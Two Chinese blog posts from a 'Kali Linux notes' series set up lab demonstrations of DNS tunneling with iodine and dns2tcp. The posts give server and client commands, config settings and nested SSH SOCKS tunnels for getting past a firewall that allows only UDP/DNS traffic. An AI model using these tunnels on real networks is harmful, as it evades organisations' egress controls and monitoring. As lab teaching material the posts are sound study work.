-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81)%EF%BC%9ADNS%E9%9A%A7%E9%81%93--iodine/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81)%EF%BC%9ADNS%E9%9A%A7%E9%81%93--iodine/" itemprop="url">Kali Linux笔记(七十)：DNS隧道--iodine</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-02T20:41:56+08:00">
-                2020-02-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  2.2k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  8 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-DNS协议隧道–iodine"><a href="#1-DNS协议隧道–iodine" class="headerlink" title="1. DNS协议隧道–iodine"></a>1. DNS协议隧道–iodine</h4><ul>
-<li>基于DNS查询的隧道工具</li>
-<li>与同类工具相比的优点<ul>
-<li>对下行数据不进行编码，因此性能优</li>
-<li>支持多平台：Linux、BSD、Mac OS、Windows</li>
-<li>最大16个并发连接</li>
-<li>强制密码支持</li>
-<li>支持同网段隧道IP（不同于服务器、客户端网段）</li>
-<li>支持多种DNS记录类型（自动协商使用的DNS记录类型）</li>
-<li>丰富的隧道质量检测措施</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-实验环境（Linux）"><a href="#2-实验环境（Linux）" class="headerlink" title="2. 实验环境（Linux）"></a>2. 实验环境（Linux）</h4><ul>
-<li>实验机子：Linux主机（bodhi）/防火墙（mono）/外网主机（Kali）</li>
-<li>Kali<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-<li>Window Server 2003（外网的DNS服务器）<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-<li>配置一个静态的IP地址，设置DNS服务器为127.0.0.1（ipconfig查询所用IP地址）</li>
-<li>安装DNS服务器<ul>
-<li>安装DNS服务器（Win+R → appwiz.cpl → 更改或添加程序 → 网络服务 → 域名系统，可能需要光盘）   </li>
-<li>开始 → 管理工具 → DNS → 正向查询区域 → 右键 → 新建区域</li>
-<li>主要区域、区域名称（lab.com）</li>
-</ul>
-</li>
-<li>NS记录指向Kali<ul>
-<li>右键lab.com空白区域 → 新建主机 → 名称（w2k3）、IP（2003的IP地址）</li>
-<li>右键lab.com空白区域 → 新建主机 → 名称（Kali）、IP（Kali的IP地址）</li>
-</ul>
-</li>
-<li>创建区域lab.com，指派二级域test.lab.com<ul>
-<li>lab.com → 右键 → 新建委派 → test → 添加（kali的主机记录）→ 解析</li>
-<li><strong><code>🔺命令：ping kali.lab.com</code></strong>查看是否能进行正常通信</li>
-</ul>
-</li>
-<li>配置转发器（转发到外网的DNS服务器，不做迭代查询）<ul>
-<li>服务器图标 → 右键 → 属性 → 转发 → 添加物理网络的DNS服务器（ipconfig查询）</li>
-<li>nslookup解析新浪和百度的域名，查看是否能正常通信</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>安装squid<ul>
-<li><strong><code>🔺命令：apt-get install squid3</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Mono防火墙<ul>
-<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li>插入bodhi-3.2.0-64.iso光盘，安装到硬盘，修改网络为Host-only方式，检查网络</li>
-<li>查看网管（netstat -nr，看是否为mono网关）</li>
-<li>浏览器登陆mono，修改之前TCP/UDP的规则，改为只允许UDP通过，保存修改</li>
-</ul>
-</li>
-<li>Window Server 2003（内网的DNS服务器）<ul>
-<li>网卡方式为Host-only方式，检查网络</li>
-<li>配置一个静态的IP地址，设置DNS服务器为127.0.0.1（ipconfig查询所用IP地址）</li>
-<li>安装DNS服务器<ul>
-<li>安装DNS服务器（Win+R → appwiz.cpl → 更改或添加程序 → 网络服务 → 域名系统，可能需要光盘）</li>
-<li>开始 → 管理工具 → DNS → 正向查询区域 → 右键 → 新建区域</li>
-<li>主要区域、区域名称（lab.com）</li>
-</ul>
-</li>
-<li>配置转发器（转发到外网的DNS服务器，不做迭代查询）<ul>
-<li>服务器图标 → 右键 → 属性 → 转发 → 外网的DNS服务器（Window Server 2003）</li>
-</ul>
-</li>
-<li>登陆防火墙查看规则（源和目的：Single host or alias，设置目的IP为Window Server 2003的IP地址）</li>
-<li>nslookup解析lab.com、test.lab.com、新浪、百度的域名，查看是否能正常通信</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li><strong><code>🔺命令：service squid start</code></strong></li>
-<li>开启SSH服务（擦除以前所作操作）</li>
-<li><strong><code>🔺命令：netstat -pantu</code></strong>（查看3128端口和22端口是否开放）</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li><strong><code>🔺命令：sudo vi /etc/resolv.conf</code></strong> → 修改为内网Window Server 2003的IP地址</li>
-<li><strong><code>🔺命令：dig -t ns lab.com</code></strong>（查看是否解析到w2k3.lab.com以及IP地址）</li>
-<li><strong><code>🔺命令：dig -t ns test.lab.com</code></strong>（查看是否正常解析）</li>
-<li>▲ 2020.2.1 dig无法正常解析，但nslookup可以正常解析，最后也能正常上网</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>运行服务器端：<strong><code>🔺命令：iodined -f -c 10.0.0.1（服务器隧道IP） test.lab.com</code></strong> <ul>
-<li>-f 前端显示（可选）</li>
-<li>-c 不检查客户端IP</li>
-<li>IP 服务器端隧道IP的地址</li>
-</ul>
-</li>
-<li>▲ 需要设置密码才能建立隧道，ifconfig查看是否多出一个网卡</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li>通过修改网卡方式为Bridge，桥接网络，进行下载iodine</li>
-<li>运行客户端：**`🔺命令：iodine -f test.lab.com（若指定IP，为局域网内DNS的IP地址）</li>
-<li>▲ 需要输入密码才能建立隧道（需同服务器端密码相同），ifconfig查看是否多出一个网卡，进行ping 服务器端的IP地址看能否相同</li>
-<li><strong><code>🔺命令：ssh root@10.0.0.1 -p 22</code></strong>进行尝试登陆，看能否能登陆成功</li>
-<li>设置浏览器代理，SOCKS proxy → 10.0.0.1:3128，进行网络访问尝试 ▲ 2020.2.2 可抓取到数据包，但无法上网，Kali的3128监听连接都是IPv6</li>
-<li><strong><code>🔺命令：ssh -CfNg -D 7001 root@10.0.0.1 -p 22</code></strong>进行嵌套SSH隧道</li>
-<li>在内网的Window Server 2003上修改Internet选项，设置代理服务器socks Proxy代理，访问网络尝试</li>
-</ul>
-</li>
-<li>隧道网络接口<ul>
-<li>不基于资源的通用隧道，如同本网段内两台相邻的主机</li>
-<li>服务器端和客户端生成隧道网络接口eth0</li>
-<li>隧道两端接口的IP地址应不同于客户端和服务器端网段</li>
-<li>基于此隧道可嵌套其他隧道技术</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-实验环境（Windows）"><a href="#2-实验环境（Windows）" class="headerlink" title="2. 实验环境（Windows）"></a>2. 实验环境（Windows）</h4><ul>
-<li>实验机子：Linux主机（bodhi）/防火墙（mono）/外网主机（Kali）</li>
-<li>Kali<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-<li>Window Server 2003（外网的DNS服务器）<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-<li>配置一个静态的IP地址，设置DNS服务器为127.0.0.1（ipconfig查询所用IP地址）</li>
-<li>安装DNS服务器<ul>
-<li>安装DNS服务器（Win+R → appwiz.cpl → 更改或添加程序 → 网络服务 → 域名系统，可能需要光盘）   </li>
-<li>开始 → 管理工具 → DNS → 正向查询区域 → 右键 → 新建区域</li>
-<li>主要区域、区域名称（lab.com）</li>
-</ul>
-</li>
-<li>NS记录指向Kali<ul>
-<li>右键lab.com空白区域 → 新建主机 → 名称（w2k3）、IP（2003的IP地址）</li>
-<li>右键lab.com空白区域 → 新建主机 → 名称（Kali）、IP（Kali的IP地址）</li>
-</ul>
-</li>
-<li>创建区域lab.com，指派二级域test.lab.com<ul>
-<li>lab.com → 右键 → 新建委派 → test → 添加（kali的主机记录）→ 解析</li>
-<li><strong><code>🔺命令：ping kali.lab.com</code></strong>查看是否能进行正常通信</li>
-</ul>
-</li>
-<li>配置转发器（转发到外网的DNS服务器，不做迭代查询）<ul>
-<li>服务器图标 → 右键 → 属性 → 转发 → 添加物理网络的DNS服务器（ipconfig查询）</li>
-<li>nslookup解析新浪和百度的域名，查看是否能正常通信</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>安装squid<ul>
-<li><strong><code>🔺命令：apt-get install squid3</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Mono防火墙<ul>
-<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
-</ul>
-</li>
-<li>Window Server 2003（内网的DNS服务器）<ul>
-<li>网卡方式为Host-only方式，检查网络</li>
-<li>配置一个静态的IP地址，设置DNS服务器为127.0.0.1（ipconfig查询所用IP地址）</li>
-<li>安装DNS服务器<ul>
-<li>安装DNS服务器（Win+R → appwiz.cpl → 更改或添加程序 → 网络服务 → 域名系统，可能需要光盘）</li>
-<li>开始 → 管理工具 → DNS → 正向查询区域 → 右键 → 新建区域</li>
-<li>主要区域、区域名称（lab.com）</li>
-</ul>
-</li>
-<li>配置转发器（转发到外网的DNS服务器，不做迭代查询）<ul>
-<li>服务器图标 → 右键 → 属性 → 转发 → 外网的DNS服务器（Window Server 2003）</li>
-</ul>
-</li>
-<li>浏览器登陆mono，修改之前TCP/UDP的规则，改为只允许UDP通过，保存修改</li>
-<li>登陆防火墙查看规则（源和目的：Single host or alias，设置目的IP为Window Server 2003的IP地址）</li>
-<li>nslookup解析lab.com、test.lab.com、新浪、百度的域名，查看是否能正常通信</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li><strong><code>🔺命令：service squid start</code></strong></li>
-<li>开启SSH服务（擦除以前所作操作）</li>
-<li>**`🔺命令：netstat -pantu（查看3128端口和22端口是否开放）</li>
-<li>运行服务器端：<strong><code>🔺命令：iodined -f -c 10.0.0.1（服务器隧道IP） test.lab.com</code></strong> <ul>
-<li>-f 前端显示（可选）</li>
-<li>-c 不检查客户端IP</li>
-<li>IP 服务器端隧道IP的地址</li>
-</ul>
-</li>
-<li>▲ 需要设置密码才能建立隧道，ifconfig查看是否多出一个网卡</li>
-</ul>
-</li>
-<li>Window Server 2003（内网的DNS服务器）<ul>
-<li>安装TAP网卡驱动<ul>
-<li>▲ 需要进行翻墙下载网卡驱动 ▲ openvpn-install-2.3.11-I001-i686.exe</li>
-<li><a href="https://openvpn.net/index.php/open-source/downloads.html" target="_blank" rel="noopener">https://openvpn.net/index.php/open-source/downloads.html</a></li>
-<li>只安装TAP Virtual Ethernet Adapter和所有依赖包</li>
-</ul>
-</li>
-<li>Windows客户端<ul>
-<li>▲ 需要进行翻墙下载iodine ▲ iodine-0.7.0-windows.zip</li>
-<li><a href="http://code.kryo.se/iodine/" target="_blank" rel="noopener">http://code.kryo.se/iodine/</a> </li>
-<li><strong><code>🔺命令：iodine -f test.lab.com</code></strong></li>
-<li>▲ 需要输入密码才能建立隧道（需同服务器端密码相同），ifconfig查看是否多出一个网卡，进行ping 服务器端的IP地址看能否相同</li>
-</ul>
-</li>
-<li>建立动态SSH隧道（使用putty）▲ 2020.2.2 安装putty报Installation Directory must be on a local hard drive的错误，但连接不存在问题，可以上Kali上的Web服务<ul>
-<li>Connection → SSH → Tunnels</li>
-<li>Local ports accept connections from other hosts</li>
-<li>Source port（7001）、Desitination（Kali的虚拟IP）、Auto、Dynamic → Add</li>
-</ul>
-</li>
-<li>修改Internet选项，设置代理服务器socks Proxy代理127.0.0.1:7001，访问网络尝试</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B9%9D)%EF%BC%9ADNS%E9%9A%A7%E9%81%93--dns2tcp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B9%9D)%EF%BC%9ADNS%E9%9A%A7%E9%81%93--dns2tcp/" itemprop="url">Kali Linux笔记(六十九)：DNS隧道--dns2tcp</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-02T13:28:25+08:00">
-                2020-02-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  2.2k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  9 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-DNS协议隧道"><a href="#1-DNS协议隧道" class="headerlink" title="1. DNS协议隧道"></a>1. DNS协议隧道</h4><ul>
-<li>防火墙禁止TCP出站访问流量<ul>
-<li>SSH隧道、端口转发全部失效</li>
-<li>使用基于UDP协议的隧道</li>
-<li>DNS的工作原理适合用于实现隧道</li>
-<li>▲ TCP53–域名服务的冗余更新，域名服务器之间的传输/UDP53–用于域名服务的查询</li>
-</ul>
-</li>
-<li>DNS工作原理<ul>
-<li>DNS隧道原理：注册受自己控制的DNS记录</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/kali/kali-notepad/DNS%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B.PNG" alt="DNS解析过程"></p>
-<p><img src="/images/kali/kali-notepad/%E4%B8%A4%E7%A7%8DDNS%E6%9F%A5%E8%AF%A2.PNG" alt="两种DNS查询"></p>
-<h4 id="2-Dns2tcp"><a href="#2-Dns2tcp" class="headerlink" title="2. Dns2tcp"></a>2. Dns2tcp</h4><ul>
-<li>利用合法的DNS服务器实现DNS隧道</li>
-<li>C/S（dns2tcpc/dns2tcpd）结构</li>
-<li>通过TXT记录加密传输数据（A记录长度有限，前面最大为63个字节）</li>
-<li>隧道建立后保持连接</li>
-<li>默认记录生存时间TTL值为3秒，由查询的DNS服务器告诉缓存时间（缓存时间越长越好）</li>
-<li>域名记录长度是有限的</li>
-<li>安装<ul>
-<li><strong><code>🔺命令：apt-get install dns2tcp</code></strong></li>
-<li>Kali默认安装</li>
-</ul>
-</li>
-<li>资源访问<ul>
-<li>本地SSH资源</li>
-<li>远程http资源</li>
-<li>http代理（squid，<strong><code>🔺命令：apt-get install squid3</code></strong>）</li>
-<li>https代理</li>
-<li>隧道嵌套<ul>
-<li>基于SSH资源将</li>
-<li><strong><code>🔺命令：ssh -CfNg root@127.0.0.1 -p 2222 -D 7001</code></strong></li>
-<li>XP IE、Firefox使用嵌套的Socks代理上网</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-实验-1"><a href="#3-实验-1" class="headerlink" title="3. 实验-1"></a>3. 实验-1</h4><ul>
-<li>实验机子：Linux主机（bodhi）/防火墙（mono）/外网主机（Kali）</li>
-<li>Mono防火墙<ul>
-<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li>插入bodhi-3.2.0-64.iso光盘，安装到硬盘，修改网络为Host-only方式，检查网络</li>
-<li>查看网管（netstat -nr，看是否为mono网关）</li>
-<li>浏览器登陆mono，修改之前TCP/UDP的规则，改为只允许UDP通过，保存修改</li>
-<li>浏览器登陆mono，开启默认规则以便能上网，下载dns2tcp、wireshark、firefox，下载完成后关闭默认规则</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-<li>Window Server 2003<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-<li>安装DNS服务器<ul>
-<li>安装DNS服务器（Win+R → appwiz.cpl → 更改或添加程序 → 网络服务 → 域名系统，可能需要光盘）</li>
-<li>配置一个静态的IP地址，设置DNS服务器为127.0.0.1（ipconfig查询所用IP地址）</li>
-<li>开始 → 管理工具 → DNS → 正向查询区域 → 右键 → 新建区域</li>
-<li>主要区域、区域名称（lab.com）</li>
-</ul>
-</li>
-<li>NS记录指向Kali<ul>
-<li>右键lab.com空白区域 → 新建主机 → 名称（Kali）、IP（Kali的IP地址）</li>
-</ul>
-</li>
-<li>创建区域lab.com，指派二级域test.lab.com<ul>
-<li>lab.com → 右键 → 新建委派 → test → 添加（Kali的主机记录）→ 解析</li>
-</ul>
-</li>
-<li>配置转发器（转发到外网的DNS服务器，不做迭代查询）<ul>
-<li>服务器图标 → 右键 → 属性 → 转发 → 添加物理网络的DNS服务器（ipconfig查询）</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li><strong><code>🔺命令：sudo vi /etc/resolv.conf</code></strong> → 修改为Window Server 2003的IP地址</li>
-<li>nslookup<ul>
-<li><strong><code>🔺命令：set q=ns lab.com</code></strong>（查看是否为Window Server 2003的IP地址）</li>
-<li><strong><code>🔺命令：set q=ns test.lab.com</code></strong>（查看是否为kali.lab.com）</li>
-<li><strong><code>🔺命令：www.baoidu.com</code></strong>（看是否能解析为外网的IP地址）</li>
-<li><strong><code>🔺命令：www.taobao.com</code></strong>（看是否能解析为外网的IP地址）</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>服务端配置文件<ul>
-<li><strong><code>🔺命令：vi /etc/dns2tcpd.conf</code></strong>（修改listen为0.0.0.0，domain为test.lab.com，增加resources：socks:127.0.0.1:22716,http:192.168.0.1:80,https:0.0.0.0:8087，key=pass123）</li>
-<li>.dns2tcprcd</li>
-<li>资源可以是其他地址</li>
-</ul>
-</li>
-<li>开启socks代理，如GoAgent；开启SSH服务（擦除以前所作操作）</li>
-<li>启动<ul>
-<li><strong><code>🔺命令：dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf</code></strong> </li>
-<li>-F：前端显示运行状态</li>
-<li>-d：dubug level 1-3</li>
-<li>-f：指定配置文件</li>
-</ul>
-</li>
-<li>开启抓包（Wireshark，只抓取dns的数据包）</li>
-</ul>
-</li>
-<li>Window Server 2003<ul>
-<li>装入抓包软件（ComView，可能需要替换exe文件）</li>
-<li>Rules → IP Addresses → Both（Kali的IP，mono防火墙的IP）</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li>禁用mono防火墙的规则</li>
-<li>启动抓包工具（sudo wireshark，需要进行过滤数据包）</li>
-<li><strong><code>🔺命令：dns2tcpc -c -k pass123 -d 1 -l 2222 -r ssh -z test.lab.com</code></strong><ul>
-<li>-c：启动压缩，提高访问效率</li>
-<li>-k：设置的密码</li>
-<li>-d：dubug level 1-3</li>
-<li>-l：本地侦听端口，用于连接隧道</li>
-<li>-r：资源名称（ssh、socks、http、https）</li>
-<li>-z：使用的域名</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：ssh root@127.0.0.1 -p 2222</code></strong></li>
-</ul>
-</li>
-<li>bodhi抓包分析、Kali抓包分析、Window Server 2003抓包分析</li>
-<li>bodhi（http）<ul>
-<li><strong><code>🔺命令：dns2tcpc -c -k pass123 -d 1 -l 2222 -r http -z test.lab.com</code></strong></li>
-<li>浏览器访问127.0.0.1:2222，是否被重定向到192.168.1.1</li>
-</ul>
-</li>
-<li>bodhi（socks）<ul>
-<li><strong><code>🔺命令：dns2tcpc -c -k pass123 -d 1 -l 2222 -r socks -z test.lab.com</code></strong></li>
-<li>浏览器配置socks代理资源，访问Google尝试</li>
-</ul>
-</li>
-<li>bodhi（ssh，作网管模式）<ul>
-<li><strong><code>🔺命令：dns2tcpc -c -k pass123 -d 1 -l 2222 -r ssh -z test.lab.com</code></strong></li>
-<li><strong><code>🔺命令：ssh -CfNg root@127.0.0.1 -p 2222 -D 7001</code></strong></li>
-</ul>
-</li>
-<li>Window XP<ul>
-<li>网卡方式为Host-only方式，检查网络</li>
-<li>浏览器 → 工具（Internet选项）→ 连接 → 局域网设置 → 设置代理服务器（bodhi的7001端口）</li>
-<li>上网尝试 ▲ 2020.2.2 ssh隧道的网管模式存在Bug，能连接但无法上网</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li>浏览器配置HTTP proxy的7001端口，进行上网尝试 ▲ 2020.2.2 ssh隧道的网管模式存在Bug，能连接但无法上网</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/kali/kali-notepad/%E6%BC%94%E7%A4%BA%E7%8E%AF%E5%A2%83-1.PNG" alt="演示环境-1"></p>
-<h4 id="4-实验-2"><a href="#4-实验-2" class="headerlink" title="4. 实验-2"></a>4. 实验-2</h4><ul>
-<li>FW限制只允许内网DNS服务器访问外网指定DNS服务器UDP53端口</li>
-<li>内网DNS服务器：安装DNS服务器，配置转发器到外网DNS服务器</li>
-<li>实验机子：Linux主机（bodhi）/防火墙（mono）/外网主机（Kali）</li>
-<li>Kali<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-<li>Window Server 2003（外网的DNS服务器）<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-<li>配置一个静态的IP地址，设置DNS服务器为127.0.0.1（ipconfig查询所用IP地址）</li>
-<li>安装DNS服务器<ul>
-<li>安装DNS服务器（Win+R → appwiz.cpl → 更改或添加程序 → 网络服务 → 域名系统，可能需要光盘）   </li>
-<li>开始 → 管理工具 → DNS → 正向查询区域 → 右键 → 新建区域</li>
-<li>主要区域、区域名称（lab.com）</li>
-</ul>
-</li>
-<li>NS记录指向Kali<ul>
-<li>右键lab.com空白区域 → 新建主机 → 名称（w2k3）、IP（2003的IP地址）</li>
-<li>本机的NS记录进行更新，指向w2k3.lab.com</li>
-<li>右键lab.com空白区域 → 新建主机 → 名称（Kali）、IP（Kali的IP地址）</li>
-</ul>
-</li>
-<li>创建区域lab.com，指派二级域test.lab.com<ul>
-<li>lab.com → 右键 → 新建委派 → test → 添加（kali的主机记录）→ 解析</li>
-<li>ping kali.lab.com查看是否能进行正常通信</li>
-</ul>
-</li>
-<li>配置转发器（转发到外网的DNS服务器，不做迭代查询）<ul>
-<li>服务器图标 → 右键 → 属性 → 转发 → 添加物理网络的DNS服务器（ipconfig查询）</li>
-<li>nslookup解析新浪和百度的域名，查看是否能正常通信</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>服务端配置文件<ul>
-<li><strong><code>🔺命令：vi /etc/dns2tcpd.conf</code></strong>（修改listen为0.0.0.0，domain为test.lab.com，增加resources：http:127.0.0.1:3128，key=pass123）</li>
-<li>.dns2tcprcd</li>
-<li>资源可以是其他地址</li>
-</ul>
-</li>
-<li>开启SSH服务（擦除以前所作操作）</li>
-<li>启动<ul>
-<li><strong><code>🔺命令：dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf</code></strong> </li>
-<li>-F：前端显示运行状态</li>
-<li>-d：dubug level 1-3</li>
-<li>-f：指定配置文件</li>
-</ul>
-</li>
-<li>安装squid<ul>
-<li><strong><code>🔺命令：apt-get install squid3</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Mono防火墙<ul>
-<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li>插入bodhi-3.2.0-64.iso光盘，安装到硬盘，修改网络为Host-only方式，检查网络</li>
-<li>查看网管（netstat -nr，看是否为mono网关）</li>
-<li>浏览器登陆mono，修改之前TCP/UDP的规则，改为只允许UDP通过，保存修改</li>
-<li>浏览器登陆mono，开启默认规则以便能上网，下载dns2tcp、wireshark、firefox，下载完成后关闭默认规则</li>
-</ul>
-</li>
-<li>Window Server 2003（内网的DNS服务器）<ul>
-<li>网卡方式为Host-only方式，检查网络</li>
-<li>配置一个静态的IP地址，设置DNS服务器为127.0.0.1（ipconfig查询所用IP地址）</li>
-<li>安装DNS服务器<ul>
-<li>安装DNS服务器（Win+R → appwiz.cpl → 更改或添加程序 → 网络服务 → 域名系统，可能需要光盘）</li>
-</ul>
-</li>
-<li>配置转发器（转发到外网的DNS服务器，不做迭代查询）<ul>
-<li>服务器图标 → 右键 → 属性 → 转发 → 外网的DNS服务器（Window Server 2003）</li>
-</ul>
-</li>
-<li>登陆防火墙查看规则（源和目的：Single host or alias，设置目的IP为Window Server 2003的内网外网IP地址）</li>
-<li>nslookup解析新浪、百度的域名，查看是否能正常通信</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li><strong><code>🔺命令：service squid start</code></strong> </li>
-<li><strong><code>🔺命令：netstat -pantu</code></strong>（查看3128端口和22端口是否开放）</li>
-</ul>
-</li>
-<li>bodhi<ul>
-<li><strong><code>🔺命令：sudo vi /etc/resolv.conf</code></strong> → 修改为内网Window Server 2003的IP地址</li>
-<li><strong><code>🔺命令：dig -t ns lab.com</code></strong>（查看是否解析到w2k3.lab.com以及IP地址）</li>
-<li><strong><code>🔺命令：dig -t ns test.lab.com</code></strong>（查看是否正常解析） ▲ 2020.2.1 dig无法正常解析，但nslookup可以正常解析，最后也能正常上网</li>
-<li><strong><code>🔺命令：dns2tcpc -c -k pass123 -d 1 -l 8080 -r http -z test.lab.com</code></strong><ul>
-<li>-c：启动压缩，提高访问效率</li>
-<li>-k：设置的密码</li>
-<li>-d：dubug level 1-3</li>
-<li>-l：本地侦听端口，用于连接隧道</li>
-<li>-r：资源名称（ssh、socks、http、https）</li>
-<li>-z：使用的域名</li>
-</ul>
-</li>
-<li>设置浏览器代理，HTTP proxy → 127.0.0.1:8080，进行网络访问尝试</li>
-</ul>
